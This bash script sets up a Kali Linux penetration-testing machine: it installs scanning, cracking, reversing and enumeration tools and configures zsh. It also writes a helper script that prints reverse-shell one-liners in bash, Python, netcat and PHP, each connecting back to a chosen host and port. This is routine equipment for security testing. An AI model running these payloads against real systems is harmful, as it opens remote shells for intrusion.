#!/bin/bash
# kali_setup.sh

set -e

echo "[*] === System Update ==="
sudo apt update && sudo apt -y full-upgrade

echo "[*] === Core CLI + Editors ==="
sudo apt install -y \
  git curl wget rsync build-essential gcc g++ make cmake \
  tmux zsh vim nano neovim \
  tree htop lsof xclip jq rlwrap ripgrep fd-find fzf

echo "[*] === Web & Network Tools ==="
sudo apt install -y \
  nmap masscan amap netcat-openbsd socat tcpdump wireshark \
  gobuster ffuf feroxbuster dirb wfuzz seclists \
  dnsutils whois dig enum4linux smbclient cifs-utils crackmapexec onesixtyone snmpcheck

echo "[*] === Fuzzing & Automation ==="
sudo apt install -y \
  python3 python3-pip python3-venv python3-dev \
  python3-pwntools python3-ptyprocess python3-virtualenvwrapper python3-requests python3-netaddr \
  pipx wfuzz ffuf feroxbuster

echo "[*] === Privilege Escalation & Enumeration ==="
sudo apt install -y \
  linpeas pspy ltrace strace upx-ucl patchelf gdb gdb-multiarch \
  exiftool steghide binwalk foremost

echo "[*] === Passwords & Cracking ==="
sudo apt install -y \
  hashcat john hydra thc-hydra medusa cupp cewl

echo "[*] === Reversing, Debugging & Exploitation ==="
sudo apt install -y \
  radare2 r2pipe pwndbg ropper gdb gef gdb-multiarch nasm apktool dex2jar jd-gui \
  apktool jadx binwalk steghide upx-ucl patchelf

echo "[*] === OSINT, Reporting, & Misc ==="
sudo apt install -y \
  whatweb theharvester maltego recon-ng eyewitness sublist3r \
  flameshot libreoffice xsltproc chromium browser-plugin-freshplayer-pepperflash \
  gh

echo "[*] === Docker & Cloud ==="
sudo apt install -y \
  docker.io docker-compose awscli azure-cli google-cloud-sdk

echo "[*] === Wordlists ==="
sudo apt install -y seclists
if [ ! -f "/usr/share/wordlists/rockyou.txt" ]; then
  sudo gunzip /usr/share/wordlists/rockyou.txt.gz || true
fi
if [ ! -d "/opt/fuzzdb" ]; then
  sudo git clone https://github.com/fuzzdb-project/fuzzdb.git /opt/fuzzdb
fi

echo "[*] === Mobile, AD, & More ==="
sudo apt install -y \
  adb fastboot android-tools-adb android-tools-fastboot \
  bloodhound bloodhound.py crackmapexec impacket-scripts \
  kerbrute ldap-utils

echo "[*] === Zsh, Powerlevel10k, and Plugins ==="
if [ ! -d "$HOME/.oh-my-zsh" ]; then
  sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended
fi
git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k || true
git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/plugins/zsh-autosuggestions || true
git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting || true

echo "[*] Installing Powerline fonts..."
git clone https://github.com/powerline/fonts.git --depth=1
cd fonts && ./install.sh && cd .. && rm -rf fonts

echo "[*] Configuring .zshrc and Powerlevel10k..."
sed -i 's/^ZSH_THEME=".*"/ZSH_THEME="powerlevel10k\/powerlevel10k"/' ~/.zshrc
if ! grep -q "zsh-autosuggestions" ~/.zshrc; then
  sed -i 's/plugins=(/plugins=(zsh-autosuggestions zsh-syntax-highlighting /' ~/.zshrc
fi
chsh -s $(which zsh)

echo "[*] === Python pipx global tools ==="
python3 -m pip install --upgrade pip
python3 -m pip install --user pipx
python3 -m pipx ensurepath
pipx install pwntools
pipx install r2pipe
pipx install ropper
pipx install pwncat-cs
pipx install mitmproxy
pipx install gdbgui

echo "[*] === Optional: VSCode ==="
sudo apt install -y code || true

echo "[*] === Helper Scripts to ~/bin ==="
mkdir -p ~/bin

cat << 'EOF' > ~/bin/revshells.sh
#!/bin/bash
LHOST="$1"; LPORT="$2"
echo "Bash: bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo "Python: python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
echo "Netcat: nc -e /bin/bash $LHOST $LPORT"
echo "PHP: php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
EOF
chmod +x ~/bin/revshells.sh

cat << 'EOF' > ~/bin/fast_ports.sh
#!/bin/bash
TARGET="$1"
echo "[*] Scanning top 1000 TCP ports with nmap..."
nmap -Pn --top-ports 1000 -T4 -oA nmap_top1000 "$TARGET"
EOF
chmod +x ~/bin/fast_ports.sh

cat << 'EOF' > ~/bin/param_fuzz.sh
#!/bin/bash
URL="$1"
WORDLIST="${2:-/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt}"
ffuf -u "$URL?PARAM=FUZZ" -w "$WORDLIST" -fs 0
EOF
chmod +x ~/bin/param_fuzz.sh

echo 'export PATH="$HOME/bin:$PATH"' >> ~/.zshrc

echo "[*] === Clean Up ==="
sudo apt autoremove -y
sudo apt clean

echo "[*] === All Done ==="
echo "Open a new terminal, select a Powerline font (like 'MesloLGS NF'), and enjoy your Kali premade setup."
echo "Run 'p10k configure' in your first zsh shell to finish Powerlevel10k setup."
